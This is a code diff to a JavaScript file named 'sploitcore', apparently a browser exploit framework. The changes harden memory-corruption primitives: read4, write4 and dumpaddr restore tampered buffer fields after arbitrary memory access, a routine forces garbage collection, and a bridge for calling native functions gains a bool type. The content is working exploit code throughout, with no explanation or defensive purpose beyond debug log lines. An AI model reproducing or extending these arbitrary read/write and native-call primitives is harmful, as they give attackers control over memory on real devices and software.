@@ -98,7 +98,11 @@ var sploitcore = function() {
 	this.stale[1] = this.temp;
 	this.leakaddr = [leaklo, leakhi];
 
-	var taddr = this.getAddr(this);
+	this.restlo = this.buf[4];
+	this.resthi = this.buf[5];
+	this.restsize = this.buf[6];
+
+	/*var taddr = this.getAddr(this);
 	var saddr = this.getAddr(this.stale);
 	var found = false;
 	for(var i = 0; i < 0x1000; i += 2) {
@@ -109,7 +113,7 @@ var sploitcore = function() {
 		}
 	}
 	if(!found)
-		throw 'Could not find this.stale';
+		throw 'Could not find this.stale';*/
 
 	this.clearBuffers(bufi);
 
@@ -196,16 +200,10 @@ sploitcore.prototype.setup = function() {
 };
 
 sploitcore.prototype.clearBuffers = function(bufi) {
-	var kg = new Uint32Array(8);
-	var tuaddr = this.getAddr(this.tu);
-	for(var i = 0; i < 8; ++i)
-		kg[i] = this.read4(tuaddr, i);
-
 	dlog('Clearing useless buffers');
-	for(var i = 0; i < this.bufs.length; ++i) {
+	for(var i = 0; i < this.bufs.length; ++i)
 		if(i != bufi)
 			this.bufs[i] = 0;
-	}
 	dlog('Done with cleanup.');
 }
 
@@ -223,17 +221,30 @@ sploitcore.prototype.dumpaddr = function(addr, count) {
 	this.buf[4] = addr[0];
 	this.buf[5] = addr[1];
 	this.buf[6] = count;
+
 	this.dumptemp(count);
+
+	this.buf[4] = this.restlo;
+	this.buf[5] = this.resthi;
+	this.buf[6] = this.restsize;
 };
 
 sploitcore.prototype.read4 = function(addr, offset) {
 	if(arguments.length == 1)
 		offset = 0;
+	var v; // Predeclaring juuuuust to make sure the GC doesn't run in the middle here...
+
 	this.buf[4] = addr[0];
 	this.buf[5] = addr[1];
 	this.buf[6] = 1 + offset;
 
-	return this.temp[offset];
+	v = this.temp[offset];
+
+	this.buf[4] = this.restlo;
+	this.buf[5] = this.resthi;
+	this.buf[6] = this.restsize;
+
+	return v;
 };
 sploitcore.prototype.write4 = function(val, addr, offset) {
 	if(arguments.length == 2)
@@ -243,6 +254,10 @@ sploitcore.prototype.write4 = function(val, addr, offset) {
 	this.buf[6] = 1 + offset;
 
 	this.temp[offset] = val;
+
+	this.buf[4] = this.restlo;
+	this.buf[5] = this.resthi;
+	this.buf[6] = this.restsize;
 };
 sploitcore.prototype.read8 = function(addr, offset) {
 	if(arguments.length == 1)
@@ -864,6 +879,9 @@ sploitcore.prototype.bridge = function(ptr, rettype) {
 					else
 						v = inp;
 					break;
+				case bool:
+					v = [~~inp, 0];
+					break;
 				case char_p:
 					inp = Array.prototype.map.call(inp, function(x) { return x.charCodeAt(0); });
 					var len = inp.length + 1;
@@ -899,10 +917,37 @@ sploitcore.prototype.bridge = function(ptr, rettype) {
 	return sub;
 };
 
-var int = 'int', char_p = 'char*', void_p = 'void*';
+sploitcore.prototype.gc = function() {
+	dlog('Beginning GC force');
+	function sub(depth) {
+		dlog('GC force ' + depth);
+		if(depth > 0) {
+			var arr = [];
+			dlog('Building...');
+			for(var i = 0; i < 10; ++i)
+				arr.push(new Uint8Array(0x40000));
+			dlog('Shifting...');
+			while(arr.length > 0)
+				arr.shift();
+			sub(depth - 1);
+		}
+	}
+	sub(15);
+	dlog('GC should be solid');
+};
+
+var int = 'int', bool = 'bool', char_p = 'char*', void_p = 'void*';
 
 function main() {
 	var sc = new sploitcore();
+
+	/*sc.gc();
+	sc.gc();
+
+	sc.getSP();
+
+	sc.gc();
+	return;*/
 
 	/*var str = 'this is a test string of length 0x25!';
 
